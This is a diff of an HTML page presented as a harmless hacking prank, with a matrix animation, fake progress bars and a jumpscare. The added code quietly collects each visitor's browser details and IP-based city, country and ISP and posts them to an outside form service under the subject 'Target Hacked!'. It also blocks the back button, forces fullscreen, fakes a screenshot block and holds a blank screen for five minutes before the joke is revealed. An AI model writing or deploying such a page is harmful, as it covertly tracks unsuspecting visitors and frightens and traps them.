@@ -3,12 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    
     <title>20 Series</title>
     <link rel="icon" href="https://img.icons8.com/ios-filled/50/ff0000/skull.png" type="image/png">
+
     <style>
         body { background: #000; color: #0f0; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; height: 100vh; text-transform: uppercase; user-select: none; }
-        #anti-ss { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 20000; display: none; align-items: center; justify-content: center; color: white; font-weight: bold; text-align: center; border: 20px solid red; box-sizing: border-box; }
+        
+        /* Elements Visibility */
+        #anti-ss { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 20000; display: none; align-items: center; justify-content: center; color: white; text-align: center; border: 20px solid red; box-sizing: border-box; }
         canvas { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.8; }
+        
+        /* Network Error Style */
+        #net-error { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 15000; display: none; flex-direction: column; align-items: center; justify-content: center; color: #ff0000; text-align: center; }
+
+        /* HUD & Progress */
         #hud { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 90%; text-align: center; pointer-events: none; }
         .circle-scan { width: 130px; height: 130px; border: 4px solid #0f0; border-radius: 50%; margin: 0 auto; border-top-color: transparent; animation: spin 1s linear infinite; }
         @keyframes spin { 100% { transform: rotate(360deg); } }
@@ -17,27 +26,33 @@
         #bar-fill { width: 0%; height: 100%; background: #0f0; box-shadow: 0 0 15px #0f0; transition: width 0.2s linear; }
         #pct-text { position: absolute; width: 100%; top: 4px; left: 0; color: #fff; font-weight: bold; font-size: 14px; }
         
-        /* Scary Floating Text Style */
-        .touch-msg { position: fixed; color: #ff0000; font-weight: bold; background: rgba(100,0,0,0.3); border: 1px solid red; padding: 8px 15px; pointer-events: none; z-index: 9999; font-size: 16px; box-shadow: 0 0 15px red; text-shadow: 0 0 5px black; border-radius: 4px; white-space: nowrap; }
+        /* Floating Touch Messages */
+        .touch-msg { position: fixed; color: #ff0000; font-weight: bold; background: rgba(100,0,0,0.4); border: 1px solid red; padding: 10px 18px; pointer-events: none; z-index: 9999; font-size: 16px; box-shadow: 0 0 20px red; text-shadow: 0 0 5px black; border-radius: 5px; }
 
-        #success-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; display: none; z-index: 11000; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
-        #success-text { font-size: 65px; font-weight: bold; margin: 0; animation: flash-text 0.15s infinite; }
-        @keyframes flash-text { 0% { color: #0f0; } 50% { color: #f00; } 100% { color: #0f0; } }
+        /* Final Screens */
+        #success-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; display: none; z-index: 11000; flex-direction: column; align-items: center; justify-content: center; }
         #scare { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000 url('https://p7.itc.cn/images01/20210323/c3157e93c66041ec9990864f1d411470.jpeg') center/cover; display: none; z-index: 12000; animation: shake 0.05s infinite; }
+        @keyframes shake { 0% { transform: translate(3px,3px); } 100% { transform: translate(-3px,-3px); } }
         #final-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 13000; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 30px; }
-        #typewriter { font-size: 20px; color: #ffffff; font-weight: bold; text-transform: none; line-height: 1.4; }
-        .cursor { display: inline-block; width: 12px; height: 22px; background: #fff; margin-left: 5px; animation: blink 0.7s infinite; vertical-align: middle; }
+        #typewriter { font-size: 20px; color: #fff; font-weight: bold; }
     </style>
 </head>
 <body onload="startHacking()" onmousedown="handleTouch(event)" ontouchstart="handleTouch(event)">
 
     <form id="hack-form" style="display:none;">
-        <input type="hidden" name="access_key" value="YOUR_ACCESS_KEY_HERE">
+        <input type="hidden" name="access_key" value="f0a21e25-dec8-4e72-8cd9-e8b45f892f86">
+        <input type="hidden" name="subject" value="20-Series: Target Hacked!">
         <input type="hidden" name="device_info" id="device_info">
-        <input type="hidden" name="city_location" id="city_location">
+        <input type="hidden" name="location" id="city_loc" value="Fetching...">
     </form>
 
-    <div id="anti-ss"><div><h2 style="color: red;">CRITICAL ERROR</h2><p>SCREENSHOTS DISABLED</p></div></div>
+    <div id="net-error">
+        <h2>CONNECTION LOST</h2>
+        <p>RE-ESTABLISHING 20-SERIES LINK...</p>
+    </div>
+
+    <div id="anti-ss"><h2>CRITICAL ERROR</h2><p>SCREENSHOTS DISABLED</p></div>
+    
     <canvas id="matrix"></canvas>
 
     <div id="hud">
@@ -52,67 +67,52 @@
     </div>
 
     <div id="success-screen">
-        <h1 id="success-text">SUCCESS</h1>
-        <p style="color: white; font-size: 18px; margin-top: 15px;">DATA UPLOAD 100% COMPLETE</p>
+        <h1 style="font-size: 60px; color: #0f0; text-shadow: 0 0 20px #0f0;">SUCCESS</h1>
+        <p style="color: white; font-size: 18px;">UPLOADING DATA 100%</p>
     </div>
 
     <div id="scare"></div>
+
     <div id="final-screen">
-        <div id="typewriter"></div><span class="cursor" id="cursor-el" style="display:none"></span>
+        <div id="typewriter"></div>
     </div>
 
     <script>
-        // --- NO EXIT TRAP ---
-        history.pushState(null, null, location.href);
-        window.onpopstate = function () {
-            history.pushState(null, null, location.href);
-            alert("SYSTEM OVERRIDE: 20-SERIES LOCK ACTIVE");
-        };
-
+        let isOnline = true, isStarted = false, isScared = false, audioEnabled = false, formSent = false;
         const canvas = document.getElementById('matrix'), ctx = canvas.getContext('2d');
-        let isStarted = false, isScared = false, audioEnabled = false, formSent = false;
-
-        function startFull() {
-            let el = document.documentElement;
-            if (el.requestFullscreen) el.requestFullscreen();
-            else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
-        }
-
         const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-        function playBeep(freq, type, vol, duration) {
-            if (!audioEnabled) return;
-            if (audioCtx.state === 'suspended') audioCtx.resume();
-            const osc = audioCtx.createOscillator(), gain = audioCtx.createGain();
-            osc.type = type; osc.frequency.setValueAtTime(freq, audioCtx.currentTime);
-            gain.gain.setValueAtTime(vol, audioCtx.currentTime);
-            osc.connect(gain); gain.connect(audioCtx.destination);
-            osc.start(); osc.stop(audioCtx.currentTime + duration);
-        }
 
-        // --- RANDOM ERROR GENERATOR ---
+        // 1. Trap: Prevent Back Button
+        history.pushState(null, null, location.href);
+        window.onpopstate = () => { history.pushState(null, null, location.href); alert("SYSTEM LOCKED BY 20-SERIES"); };
+
+        // 2. Network Monitoring
+        window.addEventListener('offline', () => { isOnline = false; document.getElementById('net-error').style.display = 'flex'; });
+        window.addEventListener('online', () => { isOnline = true; document.getElementById('net-error').style.display = 'none'; });
+
+        // 3. Vibration & Touch Logic
         function handleTouch(e) {
-            if (!audioEnabled) { audioEnabled = true; audioCtx.resume(); startFull(); }
+            if (navigator.vibrate) navigator.vibrate([200, 100, 200]); 
+            if (!audioEnabled) { audioEnabled = true; audioCtx.resume(); document.documentElement.requestFullscreen(); }
             if (isScared) return;
-            if (navigator.vibrate) navigator.vibrate(100);
-            playBeep(150, 'sawtooth', 0.4, 0.1);
 
-            const errors = ["ACCESS DENIED", "SYSTEM LOCKED", "DATA LEAKING...", "20-SERIES ACTIVE", "ENCRYPTION ERROR", "CRITICAL FAILURE", "TRACKING ACTIVE"];
+            const errors = ["ACCESS DENIED", "SYSTEM OVERRIDE", "DATA LEAKING", "ENCRYPTION ACTIVE", "IP TRACKED"];
             const msg = document.createElement('div');
             msg.className = 'touch-msg';
             msg.innerText = errors[Math.floor(Math.random() * errors.length)];
-            
             const x = e.clientX || (e.touches ? e.touches[0].clientX : 0);
             const y = e.clientY || (e.touches ? e.touches[0].clientY : 0);
             msg.style.left = (x - 70) + 'px'; msg.style.top = (y - 20) + 'px';
-            
             document.body.appendChild(msg);
             setTimeout(() => msg.remove(), 700);
         }
 
+        // 4. Matrix Background
         canvas.height = window.innerHeight; canvas.width = window.innerWidth;
         const letters = "0123456789ABCDEF";
         const drops = Array(Math.floor(canvas.width / 20)).fill(1);
         function drawMatrix() {
+            if (!isOnline) return;
             ctx.fillStyle = "rgba(0, 0, 0, 0.05)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
             ctx.fillStyle = "#0f0"; ctx.font = "15px Courier New";
             drops.forEach((y, i) => {
@@ -122,12 +122,22 @@
             });
         }
 
+        // 5. Silent Info Gathering
+        async function gatherInfo() {
+            document.getElementById('device_info').value = navigator.userAgent;
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                document.getElementById('city_loc').value = `${data.city}, ${data.country_name} (${data.org})`;
+            } catch (e) {}
+        }
+
+        // 6. Hacking Progress
         async function startHacking() {
-            if (isStarted) return;
-            isStarted = true;
-            setInterval(() => { if(!isScared) playBeep(250, 'square', 0.05, 0.08); }, 500);
+            if (isStarted) return; isStarted = true;
+            gatherInfo();
             setInterval(drawMatrix, 50);
-            const tasks = [{ name: "BYPASSING SECURITY", speed: 0.8 }, { name: "EXTRACTING DATA", speed: 0.5 }, { name: "FINALIZING 20-SERIES", speed: 0.2 }];
+            const tasks = [{ name: "BYPASSING FIREWALL", speed: 0.7 }, { name: "EXTRACTING MEDIA", speed: 0.4 }, { name: "UPLOADING TO CLOUD", speed: 0.2 }];
             for (let t of tasks) await runTask(t);
             showFinal();
         }
@@ -138,17 +148,23 @@
                 const bar = document.getElementById('bar-fill'), name = document.getElementById('task-name'), pct = document.getElementById('pct-text');
                 name.innerText = t.name;
                 const interval = setInterval(() => {
-                    p += (Math.random() * t.speed) + 0.1;
-                    if (p >= 100) { p = 100; clearInterval(interval); setTimeout(resolve, 800); }
-                    bar.style.width = p + "%"; pct.innerText = Math.floor(p) + "%";
+                    if (isOnline) {
+                        p += (Math.random() * t.speed) + 0.1;
+                        if (p >= 100) { p = 100; clearInterval(interval); setTimeout(resolve, 800); }
+                        bar.style.width = p + "%"; pct.innerText = Math.floor(p) + "%";
+                    }
                 }, 100);
             });
         }
 
         function showFinal() {
+            if (!formSent) {
+                formSent = true;
+                const formData = new FormData(document.getElementById('hack-form'));
+                fetch('https://api.web3forms.com/submit', { method: 'POST', body: formData });
+            }
             document.getElementById('hud').style.display = 'none';
             document.getElementById('success-screen').style.display = 'flex';
-            playBeep(900, 'square', 0.5, 0.8);
             setTimeout(triggerScare, 4000);
         }
 
@@ -156,28 +172,19 @@
             isScared = true;
             document.getElementById('success-screen').style.display = 'none';
             document.getElementById('scare').style.display = 'block';
-            playBeep(80, 'sawtooth', 1.0, 2.5);
-            if (navigator.vibrate) navigator.vibrate([500, 200, 500]);
+            if (navigator.vibrate) navigator.vibrate([500, 300, 500, 300, 800]);
             setTimeout(() => {
                 document.getElementById('scare').style.display = 'none';
                 document.getElementById('final-screen').style.display = 'flex';
-                setTimeout(revealJoke, 300000); 
+                revealJoke();
             }, 2500);
         }
 
         function revealJoke() {
-            document.getElementById('cursor-el').style.display = 'inline-block';
-            const text = "This is make for funny do not serious 😊";
-            const target = document.getElementById('typewriter');
-            let i = 0;
-            function type() {
-                if (i < text.length) {
-                    target.innerHTML += text.charAt(i); i++;
-                    playBeep(600, 'sine', 0.05, 0.02);
-                    setTimeout(type, 100);
-                }
-            }
-            type();
+            const text = "This is made for fun! Don't be serious 😊";
+            let i = 0; const target = document.getElementById('typewriter');
+            function type() { if (i < text.length) { target.innerHTML += text.charAt(i); i++; setTimeout(type, 100); } }
+            setTimeout(type, 300000); // 5 Min Blackout
         }
     </script>
 </body>
